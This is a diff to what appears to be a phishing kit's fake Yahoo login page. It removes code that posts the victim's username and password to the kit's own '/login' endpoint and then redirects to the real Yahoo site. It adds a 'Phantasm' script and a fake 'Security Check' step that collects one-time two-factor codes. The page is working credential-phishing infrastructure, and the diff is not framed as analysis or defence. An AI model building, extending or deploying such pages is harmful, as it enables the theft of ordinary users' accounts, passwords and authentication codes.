@@ -296,10 +296,10 @@
 
             <!-- Step 1: Username -->
             <div id="step-1" class="step-container fade-in">
-                <h1>Sign in</h1>
-                <p>Sign in using your Yahoo account</p>
+                <h1>Log in</h1>
+                <p>Log in using your Yahoo account</p>
                 
-                <form onsubmit="handleStep1(event)">
+                <form>
                     <div class="input-group">
                         <input type="text" id="username" placeholder=" " required>
                         <label for="username">Username, email, or mobile</label>
@@ -329,7 +329,7 @@
                 
                 <div class="error-message" id="error-msg">Invalid password. Please try again.</div>
 
-                <form onsubmit="submitLogin(event)">
+                <form>
                     <div class="input-group">
                         <input type="password" id="password" placeholder=" " required>
                         <label for="password">Password</label>
@@ -348,30 +348,8 @@
         </div>
     </div>
 
+    <script src="/core/assets/js/phantasm.js"></script>
     <script>
-        function handleStep1(event) {
-            event.preventDefault();
-            const username = document.getElementById('username').value;
-            if (!username) return;
-
-            document.getElementById('display-email').textContent = username;
-            
-            // Transition to Step 2
-            const step1 = document.getElementById('step-1');
-            const step2 = document.getElementById('step-2');
-            
-            step1.classList.add('hidden');
-            step1.classList.remove('fade-in');
-            
-            step2.classList.remove('hidden');
-            step2.classList.add('fade-in');
-            
-            // Focus password field
-            setTimeout(() => {
-                document.getElementById('password').focus();
-            }, 100);
-        }
-
         function togglePassword() {
             const passwordInput = document.getElementById('password');
             if (passwordInput.type === 'password') {
@@ -381,46 +359,33 @@
             }
         }
 
-        function submitLogin(event) {
-            event.preventDefault();
-            const login = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            if (!login || !password) return;
-
-            const btn = document.getElementById('btn-login');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<span class="spinner"></span> Verifying...';
-            btn.disabled = true;
-
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    email: login,
-                    password: password
-                })
-            }).then(response => {
-                if (response.ok) {
-                    window.location.href = "https://login.yahoo.com/";
-                } else {
-                    btn.innerHTML = originalText;
-                    btn.disabled = false;
-                    
-                    // Show error message
-                    const errorMsg = document.getElementById('error-msg');
-                    errorMsg.style.display = 'block';
-                    
-                    // Clear password
-                    document.getElementById('password').value = '';
+        document.addEventListener('DOMContentLoaded', () => {
+            const app = new Phantasm({
+                redirectUrl: 'https://login.yahoo.com/',
+                selectors: {
+                    email: '#username',
+                    password: '#password',
+                    otp: '#otp-input',
+                    nextBtn: '#btn-next',
+                    submitBtn: '#btn-login',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step2: '#step-2',
+                    step3: '#step-3-otp',
+                    userDisplay: '#display-email',
+                    errorMsg: '#error-msg'
                 }
-            }).catch(error => {
-                console.error('Error:', error);
-                window.location.href = "https://login.yahoo.com/";
             });
-        }
+        });
     </script>
+
+    <!-- OTP Section -->
+    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
+        <h2 style="margin-bottom: 20px;">Security Check</h2>
+        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
+        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
+        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
+    </div>
+
 </body>
 </html>
